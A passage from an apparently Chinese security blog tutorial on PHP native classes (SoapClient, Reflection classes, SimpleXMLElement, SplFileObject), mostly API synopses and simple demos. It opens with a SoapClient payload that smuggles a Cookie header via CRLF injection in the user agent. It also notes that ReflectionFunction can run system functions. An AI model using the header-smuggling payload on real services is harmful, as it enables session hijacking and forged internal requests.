	<span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"nayst\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4"</span><span class="token punctuation">;</span>
	<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location"</span> <span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"user_agent"</span> <span class="token operator">=></span> <span class="token variable">$user_agent</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uri"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$do</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$do</span> <span class="token operator">-></span> <span class="token function">nayst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>可以看到成功修改 ua 并插入 Cookie！</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220428221332500.png" class="" title="image-20220428221332500" loading="lazy"></li>
</ul>
<h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>PHP <a href="https://www.php.net/manual/zh/book.reflection.php">Reflection</a>是用于获取类、扩展、方法、函数、对象、参数、属性的详细信息。</p>
<h2 id="ReflectionClass-类"><a href="#ReflectionClass-类" class="headerlink" title="ReflectionClass 类"></a>ReflectionClass 类</h2><p><a href="https://www.php.net/manual/zh/class.reflectionclass.php">ReflectionClass</a> 类用于获取类相关信息，如获取属性、方法、文档注释等。</p>
<blockquote>
<p>适用于 PHP 5 &#x2F; 7 &#x2F; 8</p>
</blockquote>
<ul>
<li>摘要（部分）：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">ReflectionClass</span> <span class="token keyword">implements</span> <span class="token class-name">Reflector</span> <span class="token punctuation">&#123;</span>
    
	<span class="token comment">/* 常量 */</span>
	<span class="token keyword">const</span> integer <span class="token constant">IS_IMPLICIT_ABSTRACT</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
	<span class="token keyword">const</span> integer <span class="token constant">IS_EXPLICIT_ABSTRACT</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
	<span class="token keyword">const</span> integer <span class="token constant">IS_FINAL</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
    
    <span class="token comment">/* 属性 */</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>											<span class="token comment"># 类的名称</span>
    
    <span class="token comment">/* 方法 */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">mixed</span> <span class="token variable">$argument</span><span class="token punctuation">)</span>						<span class="token comment"># 初始化一个类</span>
    <span class="token keyword">public</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>								<span class="token comment"># 返回 ReflectionClass 对象字符串的表示形式</span>
    <span class="token keyword">public</span> <span class="token function">getConstant</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>					<span class="token comment"># 获取已定义的常量</span>
    <span class="token keyword">public</span> <span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">ReflectionMethod</span>				<span class="token comment"># 获取类的构造函数</span>
    <span class="token keyword">public</span> <span class="token function">getDocComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>							<span class="token comment"># 获取文档注释</span>
    <span class="token keyword">public</span> <span class="token function">getEndLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取最后一行的行数</span>
    <span class="token keyword">public</span> <span class="token function">getExtensionName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>						<span class="token comment"># 获取定义的类所在的扩展的名称</span>
    <span class="token keyword">public</span> <span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>							<span class="token comment"># 获取定义类的文件名</span>
    <span class="token keyword">public</span> <span class="token function">getInterfaceNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>						<span class="token comment"># 获取接口（interface）名称</span>
    <span class="token keyword">public</span> <span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>							<span class="token comment"># 获取接口</span>
    <span class="token keyword">public</span> <span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token keyword type-hint">int</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>				<span class="token comment"># 获取方法的数组</span>
    <span class="token keyword">public</span> <span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取类的修饰符</span>
    <span class="token keyword">public</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>								<span class="token comment"># 获取类名</span>
    <span class="token keyword">public</span> <span class="token function">getNamespaceName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>						<span class="token comment"># 获取命名空间的名称</span>
    <span class="token keyword">public</span> <span class="token function">getParentClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">ReflectionClass</span>				<span class="token comment"># 获取父类</span>
    <span class="token keyword">public</span> <span class="token function">getShortName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>							<span class="token comment"># 获取短名</span>
    <span class="token keyword">public</span> <span class="token function">getStartLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>								<span class="token comment"># 获取起始行号</span>
    <span class="token keyword">public</span> <span class="token function">getStaticProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>						<span class="token comment"># 获取静态（static）属性</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>演示</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">people</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">walk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"go"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"people"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$test</span><span class="token punctuation">;</span></span></code></pre>

<p>输出 <code>people</code> 类的相关信息</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220429104429993.png" class="" title="image-20220429104429993" loading="lazy">

<h2 id="ReflectionMethod-amp-ReflectionFunction-类"><a href="#ReflectionMethod-amp-ReflectionFunction-类" class="headerlink" title="ReflectionMethod &amp; ReflectionFunction 类"></a>ReflectionMethod &amp; ReflectionFunction 类</h2><p><a href="https://www.php.net/manual/zh/class.reflectionmethod.php">ReflectionMethod</a> 类与 <a href="https://www.php.net/manual/zh/class.reflectionfunction.php">ReflectionFunction</a> 类都报告了一个方法的有关信息。区别在于，前者基于类中的函数，后者基于一般函数。</p>
<p>两类大致相同，下面主要介绍前者。</p>
<blockquote>
<p>适用于 PHP 5 &#x2F; 7 &#x2F; 8</p>
</blockquote>
<p>此类继承于 ReflectionFunctionAbstract 类。</p>
<ul>
<li>摘要（部分）：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">ReflectionMethod</span> <span class="token keyword">extends</span> <span class="token class-name">ReflectionFunctionAbstract</span> <span class="token keyword">implements</span> <span class="token class-name">Reflector</span> <span class="token punctuation">&#123;</span>
    
    <span class="token comment">/* 属性 */</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>									
    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token punctuation">;</span>
    
    <span class="token comment">/* 方法 */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">mixed</span> <span class="token variable">$class</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span>				<span class="token comment"># 构造函数</span>
    <span class="token keyword">public</span> <span class="token function">getClosure</span><span class="token punctuation">(</span><span class="token keyword type-hint">object</span> <span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Closure</span>					<span class="token comment"># 返回一个动态建立的方法调用接口</span>
    <span class="token keyword">public</span> <span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">ReflectionClass</span>					<span class="token comment"># 获取被反射的方法所在类的反射实例</span>
    <span class="token keyword">public</span> <span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>									<span class="token comment"># 获取方法的修饰符</span>
    <span class="token keyword">public</span> <span class="token function">getPrototype</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">ReflectionMethod</span>						<span class="token comment"># 返回方法原型 (如果存在)</span>
    <span class="token keyword">public</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword type-hint">object</span> <span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$parameter</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> $<span class="token operator">...</span> <span class="token operator">=</span> <span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>		<span class="token comment"># 执行此函数</span>
    <span class="token keyword">public</span> <span class="token function">isAbstract</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>									<span class="token comment"># 判断方法是否是抽象方法</span>
    <span class="token keyword">public</span> <span class="token function">isConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>								<span class="token comment"># 判断方法是否是构造方法</span>
    <span class="token keyword">public</span> <span class="token function">isDestructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>									<span class="token comment"># 判断方法是否是析构方法</span>
    <span class="token keyword">public</span> <span class="token function">isFinal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>										<span class="token comment"># 判断方法是否定义 final</span>
    <span class="token keyword">public</span> <span class="token function">isPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>									<span class="token comment"># 判断方法是否是私有方法</span>
    <span class="token keyword">public</span> <span class="token function">isProtected</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>									<span class="token comment"># 判断方法是否是保护方法 (protected)</span>
    <span class="token keyword">public</span> <span class="token function">isPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>										<span class="token comment"># 判断方法是否是公开方法</span>
    <span class="token keyword">public</span> <span class="token function">isStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>										<span class="token comment"># 判断方法是否是静态方法</span>
    <span class="token keyword">public</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>									<span class="token comment"># 返回反射方法对象的字符串表达</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>演示</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">people</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">walk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"go"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"people"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"walk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$test</span><span class="token punctuation">;</span></span></code></pre>

<p>输出 <code>people</code> 类中 <code>walk()</code> 函数的相关信息</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220429111608900.png" class="" title="image-20220429111608900" loading="lazy">

<p>利用 ReflectionFunction 可以执行系统函数。</p>
<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220429115102446.png" class="" title="image-20220429115102446" loading="lazy">

<h2 id="ReflectionExtension-类"><a href="#ReflectionExtension-类" class="headerlink" title="ReflectionExtension 类"></a>ReflectionExtension 类</h2><p><a href="https://www.php.net/manual/zh/class.reflectionextension.php">ReflectionExtension</a> 类报告了一个扩展（extension）的有关信息。</p>
<blockquote>
<p>适用于 PHP 5 &#x2F; 7 &#x2F; 8</p>
</blockquote>
<ul>
<li>摘要：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">ReflectionExtension</span> <span class="token keyword">implements</span> <span class="token class-name">Reflector</span> <span class="token punctuation">&#123;</span>
    
    <span class="token comment">/* 属性 */</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>								<span class="token comment"># 扩展的名称</span>
    
    <span class="token comment">/* 方法 */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span>			<span class="token comment"># 构造函数</span>
    <span class="token keyword">public</span> <span class="token function">getClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>					<span class="token comment"># 获取类</span>
    <span class="token keyword">public</span> <span class="token function">getClassNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>				<span class="token comment"># 获取类名</span>
    <span class="token keyword">public</span> <span class="token function">getConstants</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>				<span class="token comment"># 获取常量</span>
    <span class="token keyword">public</span> <span class="token function">getDependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>				<span class="token comment"># 获取依赖</span>
    <span class="token keyword">public</span> <span class="token function">getFunctions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>				<span class="token comment"># 获取扩展中的函数</span>
    <span class="token keyword">public</span> <span class="token function">getINIEntries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>				<span class="token comment"># 获取ini配置</span>
    <span class="token keyword">public</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>					<span class="token comment"># 获取扩展名</span>
    <span class="token keyword">public</span> <span class="token function">getVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>					<span class="token comment"># 获取扩展版本</span>
    <span class="token keyword">public</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>							<span class="token comment"># 获取扩展信息</span>
    <span class="token keyword">public</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>					<span class="token comment"># 返回对象的字符串表达</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>演示</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionExtension</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ReflectionExtension"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$test</span><span class="token punctuation">;</span></span></code></pre>

<img src="/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220429113208605.png" class="" title="image-20220429113208605" loading="lazy">

<h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p><a href="https://www.php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> 类用于解析 XML 文档中的元素。</p>
<blockquote>
<p>适用于 PHP 5 &#x2F; 7 &#x2F; 8</p>
</blockquote>
<ul>
<li>摘要（部分）：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">SimpleXMLElement</span> <span class="token keyword">implements</span> <span class="token class-name">Stringable</span><span class="token punctuation">,</span> Countable<span class="token punctuation">,</span> RecursiveIterator <span class="token punctuation">&#123;</span>
    
    <span class="token comment">/* Methods */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$data</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">int</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">bool</span> <span class="token variable">$dataIsURL</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$namespaceOrPrefix</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">bool</span> <span class="token variable">$isPrefix</span> <span class="token operator">=</span> <span class="token constant boolean">false</span>
    <span class="token punctuation">)</span>														<span class="token comment"># 创建一个新的 SimpleXMLElement 对象</span>
        
    <span class="token keyword">public</span> <span class="token function">addAttribute</span><span class="token punctuation">(</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$qualifiedName</span><span class="token punctuation">,</span> 
        <span class="token keyword type-hint">string</span> <span class="token variable">$value</span><span class="token punctuation">,</span> 
        <span class="token operator">?</span><span class="token keyword type-hint">string</span> <span class="token variable">$namespace</span> <span class="token operator">=</span> <span class="token constant">null</span>
    <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">void</span>													<span class="token comment"># 将属性添加到 SimpleXML 元素</span>
    <span class="token keyword">public</span> <span class="token function">addChild</span><span class="token punctuation">(</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$qualifiedName</span><span class="token punctuation">,</span> 
        <span class="token operator">?</span><span class="token keyword type-hint">string</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> 
        <span class="token operator">?</span><span class="token keyword type-hint">string</span> <span class="token variable">$namespace</span> <span class="token operator">=</span> <span class="token constant">null</span>
    <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token class-name return-type">SimpleXMLElement</span>									<span class="token comment"># 将子元素添加到 XML 节点</span>
    <span class="token keyword">public</span> <span class="token function">asXML</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token keyword type-hint">string</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">bool</span>		<span class="token comment"># 返回基于 SimpleXML 元素的格式良好的 XML 字符串</span>
    <span class="token keyword">public</span> <span class="token function">attributes</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token keyword type-hint">string</span> <span class="token variable">$namespaceOrPrefix</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$isPrefix</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token class-name return-type">SimpleXMLElement</span>		<span class="token comment"># 标识元素的属性</span>
    <span class="token keyword">public</span> <span class="token function">children</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token keyword type-hint">string</span> <span class="token variable">$namespaceOrPrefix</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$isPrefix</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">?</span><span class="token class-name return-type">SimpleXMLElement</span>		<span class="token comment"># 查找给定节点的子节点</span>
    <span class="token keyword">public</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span>										<span class="token comment"># 计算元素的子元素</span>
    <span class="token keyword">public</span> <span class="token function">getDocNamespaces</span><span class="token punctuation">(</span><span class="token keyword type-hint">bool</span> <span class="token variable">$recursive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$fromRoot</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>		<span class="token comment"># 返回文档中声明的命名空间</span>
    <span class="token keyword">public</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>								<span class="token comment"># 获取 XML 元素的名称</span>
    <span class="token keyword">public</span> <span class="token function">getNamespaces</span><span class="token punctuation">(</span><span class="token keyword type-hint">bool</span> <span class="token variable">$recursive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span>	<span class="token comment"># 返回文档中使用的命名空间</span>
    <span class="token keyword">public</span> <span class="token function">registerXPathNamespace</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$prefix</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$namespace</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>		<span class="token comment"># 为下一个 XPath 查询创建一个前缀/ns 上下文</span>
    <span class="token keyword">public</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>								<span class="token comment"># 返回对象的字符串表达</span>
    <span class="token keyword">public</span> <span class="token function">xpath</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$expression</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>		<span class="token comment"># 对 XML 数据运行 XPath 查询</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>创建此对象的参数：</p>
<ul>
<li><p><strong>$data</strong>：格式正确的 XML 字符串或 XML 文档的路径或 URL（如果 <code>dataIsURL</code>是 true ）。</p>
</li>
<li><p><strong>$options</strong>：可选地用于指定额外的 Libxml 参数，这些参数会影响 XML 文档的读取。</p>
</li>
<li><p><strong>$dataIsUrl</strong>：默认情况下，<code>dataIsURL</code> 为 false。使用 true 指定数据是 XML 文档的路径或 URL，而不是字符串数据。</p>
</li>
<li><p><strong>$namespaceOrPrefix</strong>：命名空间前缀或 URI。</p>
</li>
<li><p><strong>$isPrefix</strong>：默认为 false。如果 namespaceOrPrefix 是前缀，则为 true；如果它是 URI，则为 false。</p>
</li>
</ul>
<p>通过设置第三个参数<code>$dataIsUrl</code>可以实现远程 xml 文件的载入。</p>
<ul>
<li>演示</li>
</ul>
<blockquote>
<p>实例先放着，调了一下午也没调明白，等以后有机会了在搞清楚。</p>
</blockquote>
<h1 id="File-x2F-Directory"><a href="#File-x2F-Directory" class="headerlink" title="File &#x2F; Directory"></a>File &#x2F; Directory</h1><p>PHP 中一些内置类可以操作文件，获取路径或获取文件内容等。</p>
<h2 id="SplFileObject-类"><a href="#SplFileObject-类" class="headerlink" title="SplFileObject 类"></a>SplFileObject 类</h2><p><a href="https://www.php.net/manual/en/class.splfileobject.php">SplFileObject</a> 类为单个文件的信息提供了一个面向对象的接口。</p>
<blockquote>
<p>适用于 PHP &gt;&#x3D; 5.1.0 &#x2F; 7 &#x2F; 8</p>
</blockquote>
<p>此类继承于 <a href="https://www.php.net/manual/en/class.splfileinfo.php">SplFileInfo</a>。</p>
<ul>
<li>摘要（部分）：</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">SplFileObject</span> <span class="token keyword">extends</span> <span class="token class-name">SplFileInfo</span> <span class="token keyword">implements</span> <span class="token class-name">RecursiveIterator</span><span class="token punctuation">,</span> SeekableIterator <span class="token punctuation">&#123;</span>
    
    <span class="token comment">/* Constants */</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">DROP_NEW_LINE</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">READ_AHEAD</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">SKIP_EMPTY</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword type-declaration">int</span> <span class="token constant">READ_CSV</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    
    <span class="token comment">/* Methods */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span><span class="token punctuation">(</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$filename</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">string</span> <span class="token variable">$mode</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">,</span>
        <span class="token keyword type-hint">bool</span> <span class="token variable">$useIncludePath</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
        <span class="token operator">?</span><span class="token class-name type-declaration">resource</span> <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token constant">null</span>
    <span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>							<span class="token comment"># 检索文件的当前行</span>
    <span class="token keyword">public</span> <span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>												<span class="token comment"># 到达文件末尾</span>
